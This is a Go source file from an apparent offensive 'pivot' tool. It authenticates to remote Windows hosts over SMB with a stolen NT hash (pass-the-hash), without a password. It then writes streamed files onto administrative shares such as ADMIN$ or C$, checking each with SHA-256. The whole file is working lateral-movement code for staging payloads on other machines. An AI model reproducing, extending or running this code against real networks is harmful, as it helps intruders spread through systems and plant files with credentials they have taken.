//go:build windows

package pivot

import (
	"bufio"
	"context"
	"crypto/sha256"
	"crypto/subtle"
	"encoding/hex"
	"errors"
	"io"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/FalconOpsLLC/goexec/pkg/goexec"
	goexecsmb "github.com/FalconOpsLLC/goexec/pkg/goexec/smb"
	"github.com/RedTeamPentesting/adauth"
	"github.com/oiweiwei/go-msrpc/ssp"
	"github.com/oiweiwei/go-msrpc/ssp/gssapi"

	"undertow/internal/mux"
)

var hashSMBAuthOnce sync.Once

func initHashSMBAuth() {
	hashSMBAuthOnce.Do(func() {
		gssapi.AddMechanism(ssp.SPNEGO)
		gssapi.AddMechanism(ssp.NTLM)
	})
}

func splitUNCPath(value string) (target, share, relative string, err error) {
	if !strings.HasPrefix(value, `\\`) {
		return "", "", "", errors.New("NT-hash delivery requires a UNC administrative-share path")
	}
	parts := strings.Split(strings.TrimPrefix(value, `\\`), `\`)
	if len(parts) < 3 || parts[0] == "" || parts[1] == "" {
		return "", "", "", errors.New("invalid UNC administrative-share path")
	}
	target, share = parts[0], parts[1]
	if !strings.EqualFold(share, "ADMIN$") && (len(share) != 2 || share[1] != '$' || !((share[0] >= 'A' && share[0] <= 'Z') || (share[0] >= 'a' && share[0] <= 'z'))) {
		return "", "", "", errors.New("NT-hash delivery requires an administrative share")
	}
	for _, component := range parts[2:] {
		if component == "" || component == "." || component == ".." {
			return "", "", "", errors.New("invalid UNC administrative-share path")
		}
	}
	relative = strings.Join(parts[2:], `\`)
	return target, share, relative, nil
}

func newHashSMBClient(ctx context.Context, target string, credential *WindowsCredential) (*goexecsmb.Client, error) {
	initHashSMBAuth()
	client := &goexecsmb.Client{ClientOptions: goexecsmb.ClientOptions{
		ClientOptions: goexec.ClientOptions{Host: target},
		AuthOptions: goexec.AuthOptions{
			Target:     adauth.NewTarget("cifs", target),
			Credential: &adauth.Credential{Username: credential.Username, Domain: credential.Domain, NTHash: credential.NTHash},
		},
		NoSeal: true,
	}}
	ctx = gssapi.NewSecurityContext(ctx)
	if err := client.Parse(ctx); err != nil {
		return nil, err
	}
	if err := client.Connect(ctx); err != nil {
		_ = client.Close(ctx)
		return nil, err
	}
	return client, nil
}

func serveUploadNTHash(stream *mux.Stream, reader *bufio.Reader, request FileMessage, credential *WindowsCredential) {
	target, shareName, relative, err := splitUNCPath(request.Path)
	if err != nil {
		fileError(stream, reader, err)
		return
	}
	ctx, cancel := context.WithTimeout(gssapi.NewSecurityContext(context.Background()), 5*time.Minute)
	defer cancel()
	client, err := newHashSMBClient(ctx, target, credential)
	if err != nil {
		fileError(stream, reader, err)
		return
	}
	defer client.Close(ctx)
	share, err := client.Session().Mount(shareName)
	if err != nil {
		fileError(stream, reader, err)
		return
	}
	defer share.Umount()
	file, err := share.OpenFile(relative, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0600)
	if err != nil {
		fileError(stream, reader, err)
		return
	}
	committed := false
	defer func() {
		_ = file.Close()
		if !committed {
			_ = share.Remove(relative)
		}
	}()
	if err := WriteFileMessage(stream, FileMessage{OK: true}); err != nil {
		return
	}
	hash := sha256.New()
	if _, err := io.CopyN(io.MultiWriter(file, hash), reader, request.Size); err != nil {
		fileError(stream, reader, err)
		return
	}
	expected := make([]byte, sha256.Size)
	if _, err := io.ReadFull(reader, expected); err != nil || subtle.ConstantTimeCompare(expected, hash.Sum(nil)) != 1 {
		fileError(stream, reader, errors.New("upload SHA-256 mismatch or incomplete data"))
		return
	}
	if err := file.Sync(); err != nil {
		fileError(stream, reader, err)
		return
	}
	if err := file.Close(); err != nil {
		fileError(stream, reader, err)
		return
	}
	committed = true
	_ = WriteFileMessage(stream, FileMessage{OK: true, Size: request.Size, SHA256: hex.EncodeToString(expected)})
	_ = stream.CloseWrite()
}
